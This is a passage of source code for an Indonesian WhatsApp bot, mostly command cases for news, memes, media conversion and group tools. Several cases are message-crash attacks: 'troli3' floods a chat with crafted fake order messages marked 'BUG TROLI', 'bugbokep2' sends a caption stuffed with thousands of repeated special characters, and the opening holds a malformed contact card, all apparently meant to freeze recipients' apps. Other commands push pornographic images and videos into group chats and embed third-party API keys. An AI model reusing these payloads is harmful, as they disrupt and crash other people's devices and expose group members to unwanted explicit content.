karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;\nEND:VCARD` }}}
BossRaehan.sendContact(m.chat, global.owner, fkontaak)
}
break
case 'troli3': {
if (!isCreator) return
if (isBan) throw (from)

if (args.length == 0) return m.reply(`𝐉𝐮𝐦𝐥𝐚𝐡𝐧𝐲𝐚?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
a = await BossRaehan.sendMessage(m.chat, {react: {  key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
let dok = {key : {participant : '0@s.whatsapp.net'},message: {documentMessage: {title: `© ${ownername}`,jpegThumbnail: thumb}}}
	var troli2 = generateWAMessageFromContent(m.chat,{
	"orderMessage": {
	"orderId": "599519108102353",
	"thumbnail": virgam,
	"itemCount": 1999,
	"status": "INQUIRY",
	"surface": "CATALOG",
	"message": " 𝗥𝗔𝗘𝗛𝗔𝗡 1986 ",
	"orderTitle": " BUG TROLI ", // 
	"sellerJid": "6281528628870@s.whatsapp.net",
	"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
	}
	},
	{quoted: {
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
},
	}, contextInfo:{}}) 
	BossRaehan.relayMessage(m.chat, troli2.message, { messageId: troli2.key.id, a})
	}
	}
	break
case 'bugbokep':{
if (!isCreator) return
if (isBan) throw (from)

dwhe = await getBuffer(`https://raku-web.herokuapp.com/api/bokep?apikey=RakuKeyTod`)
BossRaehan.sendMessage(m.chat, { video: dwhe, mimetype: 'video/mp4', fileName: `${command}.mp4`, caption: `Nih Bokep Nya` }, { quoted: ReyDong })
}
break
case 'bugbokep2':{
if (!isCreator) return
if (isBan) throw (from)

dwhee = await getBuffer(`https://raku-web.herokuapp.com/api/bokep?apikey=RakuKeyTod`)
BossRaehan.sendMessage(m.chat, { video: dwhee, mimetype: 'video/mp4', fileName: `${command}.mp4`, caption: `[⫹⫺ - 㑒 ❝𝗥𝗔𝗘𝗛𝗔𝗡 𝗠𝗢𝗗𝗦 ★ ϟ〽️]\ 🦇̣̣̣̣̣̣̣̣⃟   ...𝛀..𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦` }, { quoted: ReyDong })
}
break
case 'bugsange': {
if (isBan) throw (from)

if (!m.isGroup) return anjay(mess.group)
if (!isBotAdmins) return anjay(mess.botAdmin)
if (!isAdmins && !isCreator) return anjay(mess.admin)
if (args[0] === "on") {
if (AntiNsfww) return anjay('Sudah Aktif')
ntnsfww.push(from)
anjay('Sukses Telah mengaktifkan Bug Sange Di group Ini')
var groupe = await BossRaehan.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
BossRaehan.sendMessage(from, {text: `\`\`\`「 ⚠️ Peringatan ⚠️ 」\`\`\`\n\nFitur Ini Mengandung Fitur +18, Harap Jangan Coli / Colmek Melihat Nya Dan Fitur Ini Mengandung Bug`, contextInfo: { mentionedJid : mems }}, {quoted: Raehan})
} else if (args[0] === "off") {
if (!AntiNsfww) return anjay('Sudah Non Aktif')
let off = ntnsfww.indexOf(from)
ntnsfww.splice(off, 1)
anjay('Sukses Mematikan Bug Sange di group ini')
} else {
const anuala = {
image:fs.readFileSync("./DataBoss/video/thumbnail.jpg"),
gifPlayback:false,
jpegThumbnail:Mthumb,
caption: `© Hay Kak ${pushname} 👋 Selamat ${salam}

\n\n*SILAHKAN KETIK TEXT YANG ADA DI BAWAH\n\n
bugcrot
bugahay `,
}
BossRaehan.sendMessage(m.chat, anuala, `𝗥𝗔𝗘𝗛𝗔𝗡 1986${ngazap(prefix)}`, m)
}
}
break
case 'bugcrot' :
if (isBan) throw (from)

if (!m.isGroup) return anjay(mess.group)

 waifudd = await axios.get(`https://waifu.pics/api/nsfw/neko`)
const bugcrot = {
image: {url:waifudd.data.url},
caption: `© Hay Kak ${pushname} 👋 Kamu Sange Yah`,
} 
BossRaehan.sendMessage(m.chat, bugcrot, { quoted: ReyDong }).catch(err => {
 return('Error!')
})
break
case 'bugahay' :
if (isBan) throw (from)

if (!m.isGroup) return anjay(mess.group)

anjay(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/nsfw/waifu`) 
 const bugahay = {
image: {url:waifudd.data.url},
caption: `© Hay Kak ${pushname} 👋 Kamu Sange Yah`,
} 
BossRaehan.sendMessage(m.chat, bugahay, { quoted: ReyDong }).catch(err => {
 return('Error!')
})
break
//════════════════════════════//
		
case 'autovn': {
if (!isCreator && !isBan) return 
if (args.length < 1) return m.reply(`Ketik on untuk mengaktifkan\nKetik off untuk menonaktifkan`)
if (args[0] === 'on') {
if (autorecording === true) return
global.autorecording = true
m.reply(`Berhasil mengaktifkan autovn!`)
} else if (args[0] === 'off') {
if (autorecording === false) return
global.autorecording = false
m.reply(`Berhasil menonaktifkan autovn!`)
} else {
m.reply('Pilih on atau off')
}
}

break

case 'autoketik': {
if (!isCreator && !isBan) return 
if (args.length < 1) return m.reply(`Ketik on untuk mengaktifkan\nKetik off untuk menonaktifkan`)
if (args[0] === 'on') {
if (autoketik === true) return
global.autoketik = true
m.reply(`Berhasil mengaktifkan autoketik!`)
} else if (args[0] === 'off') {
if (autoketik === false) return
global.autoketik = false
m.reply(`Berhasil menonaktifkan autoketik!`)
} else {
m.reply('Pilih on atau off')
}
}

break

case 'autoavailable': {
if (!isCreator && !isBan) return 
if (args.length < 1) return m.reply(`Ketik on untuk mengaktifkan\nKetik off untuk menonaktifkan`)
if (args[0] === 'on') {
if (autoavailable === true) return
global.autoavailable = true
m.reply(`Berhasil mengaktifkan autoavailable!`)
} else if (args[0] === 'off') {
if (autoavailable === false) return
global.autoavailable = false
m.reply(`Berhasil menonaktifkan autoavailable!`)
} else {
m.reply('Pilih on atau off')
}
}

break
		
		
		
		
		
		
		
		
		
		
		
case 'jadibug1': {
if (isBan) throw (from)

if (!isCreator) return
if (!/video/.test(mime) && !/audio/.test(mime)) throw `*Send/Reply the Video/Audio You Want to Use as Audio With Caption* ${prefix + command}`
if (!quoted) throw `*Send/Reply the Video/Audio You Want to Use as Audio With Caption* ${prefix + command}`
let media = await quoted.download()
let { toAudio } = require('./DataBoss/lib/converter')
let audio = await toAudio(media, 'mp4')
BossRaehan.sendMessage(m.chat, {audio: audio, mimetype: 'audio/mpeg'}, { quoted : doc })
}
break
//════════════════════════════//
case 'jadibug2': {
if (isBan) throw (from)

if (!isCreator) return
if (/document/.test(mime)) throw `*Send/Reply Video/Audio You Want to Convert into MP3 With Caption* ${prefix + command}`
if (!/video/.test(mime) && !/audio/.test(mime)) throw `*Send/Reply Video/Audio You Want to Convert into MP3 With Caption* ${prefix + command}`
if (!quoted) throw `*Send/Reply Video/Audio You Want to Convert into MP3 With Caption* ${prefix + command}`
let media = await quoted.download()
let { toAudio } = require('./DataBoss/lib/converter')
let audio = await toAudio(media, 'mp4')
BossRaehan.sendMessage(m.chat, {document: audio, mimetype: 'audio/mpeg', fileName: `Convert By ${BossRaehan.user.name}.mp3`}, { quoted : doc})
}
break
//════════════════════════════//
case 'jadibug3': {
if (!isCreator) return
if (isBan) throw (from)

if (!/video/.test(mime) && !/audio/.test(mime)) throw `*Reply Video/Audio That You Want To Be VN With Caption* ${prefix + command}`
if (!quoted) throw `*Reply Video/Audio That You Want To Be VN With Caption* ${prefix + command}` (from)
let media = await quoted.download()
let { toPTT } = require('./DataBoss/lib/converter')
let audio = await toPTT(media, 'mp4')
BossRaehan.sendMessage(m.chat, {audio: audio, mimetype:'audio/mpeg', ptt:true }, {quoted:ReyDong})
}
break
//════════════════════════════//
case 'jadibug4': {
if (isBan) throw (from)

if (!isCreator) return
if (!quoted) throw 'Reply Image'
if (!/webp/.test(mime)) throw `Balas sticker dengan caption *${prefix + command}*`
let media = await BossRaehan.downloadAndSaveMediaMessage(quoted)
let ran = await getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) throw err
let buffer = fs.readFileSync(ran)
BossRaehan.sendMessage(m.chat, { image: buffer }, { quoted: ReyDong })
fs.unlinkSync(ran)
})
}
break
//════════════════════════════//
case 'jadibug5': {
if (!isCreator) return
if (isBan) throw (from)

if (!quoted) throw 'Reply Image'
if (/image/.test(mime)) {
anu = await BossRaehan.downloadAndSaveMediaMessage(quoted)
BossRaehan.sendMessage(m.chat, {image: {url: anu},viewOnce : true},{quoted: ReyDong })
} else if (/video/.test(mime)) {
anu = await BossRaehan.downloadAndSaveMediaMessage(quoted)
BossRaehan.sendMessage(m.chat, {video: {url: anu},viewOnce : true},{quoted: ReyDong })
}
}
break
//════════════════════════════//
//SOUND//
//════════════════════════════//

//════════════════════════════//
//════════════════════════════//
case 'inspect': {
if (isBan) throw (from)

if (!args[0]) return anjay("Linknya?")
let linkRegex = args.join(" ")
let coded = linkRegex.split("https://chat.whatsapp.com/")[1]
if (!coded) return anjay("Link Invalid")
BossRaehan.query({
tag: "iq",
attrs: {
type: "get",
xmlns: "w:g2",
to: "@g.us"
},
content: [{ tag: "invite", attrs: { code: coded } }]
}).then(async(res) => { 
tekse = `「 Group Link Inspector 」
▸ ID : ${res.content[0].attrs.id ? res.content[0].attrs.id : "undefined"}
▸ Subject : ${res.content[0].attrs.subject ? res.content[0].attrs.subject : "undefined"}
▸ Subject update by : ${res.content[0].attrs.s_o.split("@")[0] ? "@" + res.content[0].attrs.s_o.split("@")[0] : "undefined"}
▸ Subject update at : ${res.content[0].attrs.s_t ? moment(res.content[0].attrs.s_t *1000).tz("Asia/Jakarta").format("DD-MM-YYYY, HH:mm:ss") : "undefined"}
▸ Create by : ${res.content[0].attrs.creator ? "@" + res.content[0].attrs.creator.split("@")[0] : "undefined"}
▸ Create at : ${res.content[0].attrs.creation ? moment(res.content[0].attrs.creation * 1000).tz("Asia/Jakarta").format("DD-MM-YYYY, HH:mm:ss") : "undefined"}
▸ Total Members : ${res.content[0].attrs.size ? res.content[0].attrs.size : "undefined"} Members
▸ Desc update by : ${res.content[0].content[0].attrs.participant ? "@" + res.content[0].content[0].attrs.participant.split("@")[0] : "undefined"}
▸ Desc update at : ${res.content[0].content[0].attrs.t ? moment(res.content[0].content[0].attrs.t * 1000).tz("Asia/Jakarta").format("DD-MM-YYYY, HH:mm:ss") : "undefined"}
▸ Desc id : ${res.content[0].content[0].attrs.id ? res.content[0].content[0].attrs.id : "undefined"}
▸ Description : ${res.content[0].content[0].content[0].content ? res.content[0].content[0].content[0].content.toString() : "No Description"}
`
try {
pp = await BossRaehan.profilePictureUrl(res.content[0].attrs.id + "@g.us", "image")
} catch {
pp = "https://tse2.mm.bing.net/th?id=OIP.n1C1oxOvYLLyDIavrBFoNQHaHa&pid=Api&P=0&w=153&h=153"
}
BossRaehan.sendFile(m.chat, pp, "", m, { caption: tekse, mentions: await BossRaehan.parseMention(tekse) })
})
}
break
//════════════════════════════//
case 'asupan':
if (isBan) throw (from)

teks = `nih Kak >\\<`
buffer = `https://api.zacros.my.id/asupan/random`
BossRaehan.sendMessage(from, {video:{url:buffer}, mimetype:"video/mp4", caption:"Success"}, {quoted: Raehan})
break
//════════════════════════════//
case 'asupanukhty':
case 'asupan-ukhty':
if (isBan) throw (from)

teks = `nih Kak >\\<`
buffer = `https://api.zacros.my.id/asupan/ukhty`
BossRaehan.sendMessage(from, {video:{url:buffer}, mimetype:"video/mp4", caption:"Ini Kak Jangan Lupa Donasi Ya:)"}, {quoted: Raehan})
break
//════════════════════════════//
case 'asupan-santuy':
case 'asupansantuy':
if (isBan) throw (from)

teks = `nih Kak >\\<`
buffer = `https://api.zacros.my.id/asupan/santuy`
BossRaehan.sendMessage(from, {video:{url:buffer}, mimetype:"video/mp4", caption:"Ini Kak Jangan Lupa Donasi Ya:)"}, {quoted: Raehan})
break
//════════════════════════════//
case 'hijaber':
if (isBan) throw (from)

teks = `nih Kak >\\<`
buffer = `https://api.zacros.my.id/asupan/hijaber`
BossRaehan.sendMessage(from, {image:{url:buffer}, caption:"Done!"}, {quoted: Raehan})
break
//════════════════════════════//
case 'cecan-indo':
if (isBan) throw (from)

teks = `nih Kak >\\<`
buffer = `https://api.zacros.my.id/asupan/indonesia`
BossRaehan.sendMessage(from, {image:{url:buffer}, caption:"Done!"}, {quoted: Raehan})
break
//════════════════════════════//
case 'cecan-malaysia':
if (isBan) throw (from)

teks = `nih Kak >\\<`
buffer = `https://api.zacros.my.id/asupan/malaysia`
BossRaehan.sendMessage(from, {image:{url:buffer}, caption:"Done!"}, {quoted: Raehan})
break
//════════════════════════════//
case 'cecan-thai':
if (isBan) throw (from)

teks = `nih Kak >\\<`
buffer = `https://api.zacros.my.id/asupan/thailand`
BossRaehan.sendMessage(from, {image:{url:buffer}, caption:"Done!"}, {quoted: Raehan})
break
//════════════════════════════//
case 'cecan-vietnam':
if (isBan) throw (from)

teks = `nih Kak >\\<`
buffer = `https://api.zacros.my.id/asupan/vietnam`
BossRaehan.sendMessage(from, {image:{url:buffer}, caption:"Done!"}, {quoted: Raehan})
break
//════════════════════════════//
case 'cecan-korea':
if (isBan) throw (from)

teks = `nih Kak >\\<`
buffer = `https://api.zacros.my.id/asupan/korea`
BossRaehan.sendMessage(from, {image:{url:buffer}, caption:"Done!"}, {quoted: Raehan})
break
//════════════════════════════//
case 'cecan-jepan':
if (isBan) throw (from)

teks = `nih Kak >\\<`
buffer = `https://api.zacros.my.id/asupan/japan`
BossRaehan.sendMessage(from, {image:{url:buffer}, caption:"Done!"}, {quoted: Raehan})
break
//════════════════════════════//
case 'cecan':
if (isBan) throw (from)

teks = `nih Kak >\\<`
buffer = `https://api.zacros.my.id/asupan/cecan`
BossRaehan.sendMessage(from, {image:{url:buffer}, caption:"Done!"}, {quoted: Raehan})
break
//════════════════════════════//
case 'ban': case 'banned': {
if (!isCreator) return
if (isBan) throw (from)

if (!args[0]) return anjay(`*Enter Option Select add or delete*`)
if (args[1]) {
orgnye = args[1] + "@s.whatsapp.net"
} else if (m.quoted) {
orgnye = m.quoted.sender
}
const isBane = banned.includes(orgnye)
if (args[0] === "add") {
if (isBane) return anjay('*User has been banned*')
banned.push(orgnye)
anjay(`Succes ban`)
} else if (args[0] === "del") {
if (!isBane) return anjay('*ban lifted you happy*')
let delbans = banned.indexOf(orgnye)
banned.splice(delbans, 1)
anjay(`*Success Removing Banned Users*`)
} else {
anjay("Error")
}
}
break
//════════════════════════════//
//════════════════════════════//
case 'searchgroups':
if (isBan) throw (from)

if (!q) return anjay(`Example: ${prefix}searchgroups hacker`)
mel.linkwa(q)
.then(result => {
let res = '❰ *WHATSAPP GROUP LINKS* ❱\n\n'
for (let i of result) {
res += `*NAME*: *${i.nama}\n*Link*: ${i.link}\n\n`
}
anjay(res)
});
break
//════════════════════════════//
// Bacot Kau
//════════════════════════════//
case 'once': case 'toonce': { 
if (isBan) throw (from)

if (!quoted) throw 'Reply Image'
if (/image/.test(mime)) {
anu = await BossRaehan.downloadAndSaveMediaMessage(quoted)
BossRaehan.sendMessage(m.chat, {image: {url: anu},viewOnce : true},{quoted: Raehan })
} else if (/video/.test(mime)) {
anu = await BossRaehan.downloadAndSaveMediaMessage(quoted)
BossRaehan.sendMessage(m.chat, {video: {url: anu},viewOnce : true},{quoted: Raehan })
}
}
break
//════════════════════════════//
//════════════════════════════//
case 'translate': case 'terjemahan': case 'tr': {
if (isBan) throw (from)

if (!args.join(" ")) return anjay("Text?")
tes = await fetchJson (`https://megayaa.herokuapp.com/api/translate?to=en&kata=${args.join(" ")}`)
Infoo = tes.info
Detek = tes.translate
anjay(`🌐Translate : ${Detek}\n📘Results : ${Infoo}`)
}
break
//════════════════════════════//
case 'bully': case 'waifu': case 'cuddle': case 'neko': case 'cry': case 'kiss': case 'hug': case 'awoo': case 'lick': {
if (isBan) throw (from)

let anu = await getBuffer(`https://yx-api.herokuapp.com/api/sfw/${command}`)
BossRaehan.sendMessage(m.chat, { image: anu, caption: `NihKak` }, { quoted: Raehan})
}
break
//════════════════════════════//
case 'kill':case 'pat':case 'lick':case 'bite':case 'yeet':case 'bonk':case 'wink':case 'poke':case 'nom':case 'slap':case 'smile':case 'wave':case 'blush':case 'smug':case 'glomp':case 'happy':case 'dance':case 'cringe':case 'highfive':case 'handhold':
if (isBan) throw (from)

axios.get(`https://api.waifu.pics/sfw/waifu`)
.then(({data}) => {
BossRaehan.sendImage(m.chat, data.url, mess.success, m)
})
break
//════════════════════════════//
//════════════════════════════//
case 'darkjoke':{
if (isBan) throw (from)

anu = await getBuffer(`https://api.xteam.xyz/asupan/darkjoke?APIKEY=apivproject`)
BossRaehan.sendMessage(m.chat, { image: anu, caption: `Beliau ini....` }, { quoted: Raehan}).catch((err) => anjay('Maaf server Xteam sedang down'))
}
break
//════════════════════════════//
case 'meme':{
if (isBan) throw (from)

anu = await getBuffer(`https://api.xteam.xyz/randomimage/meme?APIKEY=apivproject`)
BossRaehan.sendMessage(m.chat, { image: anu, caption: `Bilek` }, { quoted: Raehan}).catch((err) => anjay('Maaf server Xteam sedang down'))
}
break
//════════════════════════════//
case 'meme2':{
if (isBan) throw (from)

anu = await getBuffer(`https://api.xteam.xyz/randomimage/meme2?APIKEY=apivproject`)
BossRaehan.sendMessage(m.chat, { image: anu, caption: `bilek` }, { quoted: Raehan}).catch((err) => anjay('Maaf server Xteam sedang down'))
}
break
//════════════════════════════//
case 'ss': case 'ssweb': {
if (isBan) throw (from)

////if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return anjay(mess.endLimit)
if (!text) throw `Example : ${prefix + command} Url`
anu = await fetchJson(`https://shot.screenshotapi.net/screenshot?&url=${text}`) 
buf = await getBuffer(anu.screenshot) 
BossRaehan.sendMessage(m.chat, { image: { url: anu.screenshot }, jpegThumbnail:buf, caption: `*${command} From ${text}*` }, { quoted: Raehan }).catch((err) => anjay(jsonformat('*error*')))
}
break
//════════════════════════════//
case 'fajar-news':
if (isBan) throw (from)

FajarNews().then(async(res) => {
console.log(res) 
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
anjay(teks) 
})
break
//════════════════════════════//
case "quotes":
if (isBan) throw (from)

var res = await Quotes()
teks += `\nAuthor: ${res.author}\n`
teks += `\nQuotes:\n`
teks += `${res.quotes}\n`
teks += ""
anjay(teks)
break
//════════════════════════════//
case "darkjoke": case "darkjokes":
if (isBan) throw (from)

var res = await Darkjokes()
teks = "*Darkjokes*"
BossRaehan.sendMessage(m.chat, { image : { url : res }, caption: teks }, { quoted : Raehan })
break
//════════════════════════════//
case 'cnn-news':
if (isBan) throw (from)

CNNNews().then(res => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
anjay(teks) 
})
break
//════════════════════════════//
case 'layarkaca-search':
if (isBan) throw (from)

if (!q) return anjay('Judul') 
LayarKaca21(q).then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Film: ${i.film_title}\n`
teks += `Link: ${i.film_link}\n`
}
teks += ``
anjay(teks) 
})
break
//════════════════════════════//
case 'cnbc-news':
if (isBan) throw (from)

CNBCNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
BossRaehan.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted : Raehan })
})
break
//════════════════════════════//
case 'tribun-news':
if (isBan) throw (from)

TribunNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
BossRaehan.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted : Raehan })
})
break
//════════════════════════════//
case 'indozone-news':
if (isBan) throw (from)

IndozoneNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
BossRaehan.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted : Raehan })
})
break
//════════════════════════════//
case 'kompas-news':
if (isBan) throw (from)

KompasNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
BossRaehan.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted : Raehan })
})
break
//════════════════════════════//
case 'detik-news':
if (isBan) throw (from)

DetikNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
